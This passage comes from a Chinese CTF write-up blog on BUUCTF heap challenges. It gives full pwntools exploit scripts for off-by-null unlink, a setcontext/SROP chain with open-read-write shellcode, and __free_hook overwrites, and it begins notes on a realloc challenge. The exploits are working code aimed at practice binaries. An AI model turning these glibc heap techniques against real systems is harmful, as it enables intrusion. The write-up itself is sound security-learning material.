class="line">libc_base=u64(ru(b&quot;\x7f&quot;).ljust(8,b&quot;\0&quot;))+0x7fb41b04c000-0x7fb41b410b78</span><br><span class="line">free(5)</span><br><span class="line">add(0x18,b&quot;0&quot;,0x18,b&quot;0&quot;)</span><br><span class="line">add(0x58,p64(1)+p64(0)+p64(libc_base+libc.sym[&quot;__free_hook&quot;])+p64(0x18),0x18,b&quot;0&quot;)</span><br><span class="line">changeName(b&quot;a&quot;*32)</span><br><span class="line">edit(1,p64(libc_base+libc.sym[&quot;system&quot;])+b&quot;\n&quot;)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h2 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h2><h3 id="ycb-2020-easy-heap"><a href="#ycb-2020-easy-heap" class="headerlink" title="ycb_2020_easy_heap"></a>ycb_2020_easy_heap</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ycb_2020_easy_heap">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>这个题目算是很复杂的了，其实整体不复杂，有一个很明显的off by null,unlink构造堆块重叠，但是我们由于题目版本过高，2.30,多了很多check,并且还是沙盒，所以很麻烦</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843317983-504f3d1f-c91d-4a45-a957-a890d5b06521.png#averageHue=%23fbfaf8&clientId=u9d5fd636-f51f-4&from=paste&height=190&id=u34287dfb&originHeight=237&originWidth=889&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79155&status=done&style=none&taskId=u8e15dc74-c1db-4788-9b46-f1e8e5b10e8&title=&width=711.2" alt="image.png"></p>
<p>可以看到check了prevsize和chunksize,所以一般的off by null伪造prevsize都会失败，所以我们这里自己在堆上构造一个ptr伪造unlink</p>
<p>泄露libc 和堆地址</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843327375-74741854-7c3b-408a-8696-6d6e18d21ea5.png#averageHue=%232c2c2b&clientId=u9d5fd636-f51f-4&from=paste&height=350&id=ude69b305&originHeight=437&originWidth=908&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81672&status=done&style=none&taskId=u242fa658-6df2-447f-9ec0-6c4015f3cb3&title=&width=726.4" alt="image.png"></p>
<p>首先利用off by null修改prev size和pre_inuse,然后由于我们后free的第三块，所以在第三块里伪造了第一块的堆地址，就是fake ptr,然后后面add的第三块其实是原来的第一个块，然后伪造fd bk,这里4是为了把没有用完的unsorted bin用完，保证unosrted bin为空，不然报错</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843339274-55e9f9e7-ca76-47b9-9a9f-5c48ea3adc95.png#averageHue=%23343433&clientId=u9d5fd636-f51f-4&from=paste&height=194&id=uc40a5650&originHeight=242&originWidth=907&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67717&status=done&style=none&taskId=ued597f2d-c75e-4666-8a04-d7b44ea8099&title=&width=725.6" alt="image.png"></p>
<p>这个时候可以unlink,因为我们伪造了size</p>
<p>这个时候伪造堆块重叠，因为第五这里</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843347770-942d7bc6-2e62-47b0-85f8-d8a9311b6eb0.png#averageHue=%23242322&clientId=u9d5fd636-f51f-4&from=paste&height=254&id=u01c295fc&originHeight=318&originWidth=895&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66777&status=done&style=none&taskId=u75bcef54-5fab-46fe-a281-105586f90d5&title=&width=716" alt="image.png"></p>
<p>libc-2.30 tcache不可以double free因为他会遍历整个free bins</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843357233-8bf6619b-6bb9-43e7-ae51-9699f7d9a5e9.png#averageHue=%23fdfcfb&clientId=u9d5fd636-f51f-4&from=paste&height=627&id=uabfc821b&originHeight=784&originWidth=918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=220144&status=done&style=none&taskId=u95503d9f-b5a2-4360-b180-beb4b749088&title=&width=734.4" alt="image.png"></p>
<p>同时不能分配成负数，libc2.23可以分配成负数</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843365320-d04fb15b-2096-4787-a5fd-a9de3adedd4c.png#averageHue=%23fdfcfc&clientId=u9d5fd636-f51f-4&from=paste&height=151&id=u38335324&originHeight=189&originWidth=817&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34841&status=done&style=none&taskId=ub6ab5411-679b-432d-a038-adb4fc6c61b&title=&width=653.6" alt="image.png"></p>
<p>所以我们只能free两个，然后利用还有的指针修改fd</p>
<p>由于开了沙盒，所以要用setcontext<br>这里setcontext也变复杂了，用的是rdx,所以我们要先把rdx修改然后再来setcontext,但整体srop没有变</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843373383-472f2065-c143-44a8-836f-3c0cc7458107.png#averageHue=%23171616&clientId=u9d5fd636-f51f-4&from=paste&height=200&id=u66e40f97&originHeight=250&originWidth=885&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91885&status=done&style=none&taskId=uc62be43e-7bc6-498a-a1e2-60745a0cca5&title=&width=708" alt="image.png"></p>
<p>很牛逼的gadget,其中rdx就是[rdi]+8,function[rdx+0x20]</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + <span class="number">8</span>] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + <span class="number">0x20</span>] <span class="number">0x0000000000154b90</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">heap_start_addr=heap_addr+<span class="number">0x50</span><span class="meta">#srop mem的地址</span></span><br><span class="line">rop_start_addr=<span class="number">0xb0</span>+heap_start_addr#就是我们srop头结束的位置，也就是fake <span class="built_in">stack</span>加shellcode</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(heap_start_addr)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc_base+libc.sym[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">61</span>)#一个是rdx,一个是function</span><br><span class="line">payload=payload.ljust(<span class="number">0x68</span>,b<span class="string">&quot;\0&quot;</span>)</span><br><span class="line">payload=payload+p64(rop_start_addr&amp;<span class="number">0xfffffffffffff000</span>)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(rop_start_addr+<span class="number">8</span>)+p64(libc_base+libc.sym[<span class="string">&quot;mprotect&quot;</span>])#这里没变</span><br><span class="line">shellcode=f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rax,&#123;convert_str_asmencode(&quot;</span>flag<span class="string">&quot;)&#125;;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,2;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rdi,rax;</span></span><br><span class="line"><span class="string">mov dl,0x40;</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov al,0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">xor rdi,rdi;</span></span><br><span class="line"><span class="string">mov al,1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(rop_start_addr+<span class="number">0x10</span>)+<span class="keyword">asm</span>(shellcode)</span><br><span class="line">add(len(payload))#<span class="number">6</span></span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure>

<p>最后就是淦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./ycb_2020_easy_heap&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">29270</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0x1730)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xw $rebase(0x4060)</span></span><br><span class="line"><span class="string">    x/10xg $rebase(0x4460)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    sla(b<span class="string">&quot;Choice:&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Size: &quot;</span>,str(size))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;Choice:&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sla(b<span class="string">&quot;Choice:&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    sla(b<span class="string">&quot;Choice:&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    sa(b<span class="string">&quot;Content: \n&quot;</span>,content)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>)#<span class="number">0</span></span><br><span class="line">add(<span class="number">0x18</span>)#<span class="number">1</span></span><br><span class="line">add(<span class="number">0x4f8</span>)#<span class="number">2</span></span><br><span class="line">add(<span class="number">0x28</span>)#<span class="number">3</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x28</span>)#<span class="number">0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(b<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base=u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))<span class="number">-0x7f82d01d4fd0</span>+<span class="number">0x7f82cffea000</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x28</span>)#<span class="number">0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(b<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_addr=u64(rud(b<span class="string">&quot;[&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0x430</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr))</span><br><span class="line">add(<span class="number">0x28</span>)#<span class="number">3</span></span><br><span class="line">ptr_addr=heap_addr+<span class="number">0x940</span></span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x431</span>)+p64(ptr_addr<span class="number">-0x18</span>)+p64(ptr_addr<span class="number">-0x10</span>))</span><br><span class="line">add(<span class="number">0x3e8</span>)#<span class="number">4</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)#<span class="number">2</span></span><br><span class="line">add(<span class="number">0x18</span>)#<span class="number">5</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">add(<span class="number">0x18</span>)#<span class="number">2</span></span><br><span class="line">add(<span class="number">0x18</span>)#<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20] 0x0000000000154b90</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,p64(libc_base+<span class="number">0x0000000000154b90</span>))</span><br><span class="line"></span><br><span class="line">heap_start_addr=heap_addr+<span class="number">0x50</span></span><br><span class="line">rop_start_addr=<span class="number">0xb0</span>+heap_start_addr</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(heap_start_addr)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc_base+libc.sym[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">61</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x68</span>,b<span class="string">&quot;\0&quot;</span>)</span><br><span class="line">payload=payload+p64(rop_start_addr&amp;<span class="number">0xfffffffffffff000</span>)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(rop_start_addr+<span class="number">8</span>)+p64(libc_base+libc.sym[<span class="string">&quot;mprotect&quot;</span>])</span><br><span class="line">shellcode=f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rax,&#123;convert_str_asmencode(&quot;</span>flag<span class="string">&quot;)&#125;;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,2;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rdi,rax;</span></span><br><span class="line"><span class="string">mov dl,0x40;</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov al,0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">xor rdi,rdi;</span></span><br><span class="line"><span class="string">mov al,1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(rop_start_addr+<span class="number">0x10</span>)+<span class="keyword">asm</span>(shellcode)</span><br><span class="line">add(len(payload))#<span class="number">6</span></span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">6</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h3 id="others-pwn1"><a href="#others-pwn1" class="headerlink" title="others_pwn1"></a>others_pwn1</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#others_pwn1">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>一个傻逼题，直接溢出修改指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./pwn1&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">27903</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *0x400C22</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg 0x602060</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#name有一处</span></span><br><span class="line">def add(name,content):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Please give me the book&#x27;s name :\n&quot;</span>,name)</span><br><span class="line">    sa(b<span class="string">&quot;Please input the description about the book:\n&quot;</span>,content)</span><br><span class="line">    sla(b<span class="string">&quot;How many book you want to take?\n&quot;</span>,b<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Which book you want to delete?\n&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Which book you want to edit?\n&quot;</span>,str(index))</span><br><span class="line">    sa(b<span class="string">&quot;Please give me the book&#x27;s name :\n&quot;</span>,content)</span><br><span class="line">    sla(b<span class="string">&quot;Do you want to change the description?(y/n)&quot;</span>,b<span class="string">&quot;n&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;How many book you want to take?&quot;</span>,b<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>,b<span class="string">&quot;b&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">0x48</span>+p64(elf.got[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line">show()</span><br><span class="line">ru(b<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">libc_base=u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))<span class="number">-0x7fcd58e6a690</span>+<span class="number">0x7fcd58dfb000</span></span><br><span class="line">sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;Which book you want to edit?\n&quot;</span>,b<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;Please give me the book&#x27;s name :\n&quot;</span>,b<span class="string">&quot;/bin/sh\0&quot;</span>.ljust(<span class="number">0x48</span>,b<span class="string">&quot;a&quot;</span>)+p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">sla(b<span class="string">&quot;Do you want to change the description?(y/n)&quot;</span>,b<span class="string">&quot;y&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;Please input the description about the book:\n&quot;</span>,p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">sla(b<span class="string">&quot;How many book you want to take?&quot;</span>,b<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h2><h3 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#roarctf_2019_realloc_magic">https://buuoj.cn/challenges#roarctf_2019_realloc_magic</a></p>
<p>挺好的题目，出题也很高端，从realloc的机制以及IO attack，都很好</p>
<p>free不清空，可以double free</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843403293-de826d88-61da-4449-8b64-48489c51e2fa.png#averageHue=%23fbfbfb&clientId=u9d5fd636-f51f-4&from=paste&height=194&id=u306eaea5&originHeight=243&originWidth=587&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15511&status=done&style=none&taskId=u0d08d5eb-74ab-45f9-a153-d31be0aef19&title=&width=469.6" alt="image.png"></p>
<p>realloc分配</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843409002-318db4da-6390-4344-b9e0-99a88def2c00.png#averageHue=%23fefefe&clientId=u9d5fd636-f51f-4&from=paste&height=182&id=ud2aa4877&originHeight=228&originWidth=763&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33701&status=done&style=none&taskId=u229ab190-b96d-49f1-a34f-bdf3fe7d3cd&title=&width=610.4" alt="image.png"></p>
<p>用来清空一次ptr,不然realloc打IO之后打不了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843415101-762532d4-f90a-4c81-9827-949079e452bd.png#averageHue=%23fcfcfc&clientId=u9d5fd636-f51f-4&from=paste&height=175&id=u0d97997b&originHeight=219&originWidth=761&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23046&status=done&style=none&taskId=u2fbf9ad9-ae64-4c1a-b9a5-410a5503cbb&title=&width=608.8" alt="image.png"></p>
<p>realloc用到的几种情况</p>
<ul>
<li>ptr≠NULL,size&#x3D;0,相当于free</li>
<li>ptr&#x3D;&#x3D;NULL,size≠NULL,相当于malloc</li>
<li>ptr≠NULL,size&gt;,会尝试合并后面的，如果后面是top chunk就直接切割top chunk调整大小，如果后面的是free状态就会unlink,(所以要打unsorted bin)</li>
</ul>
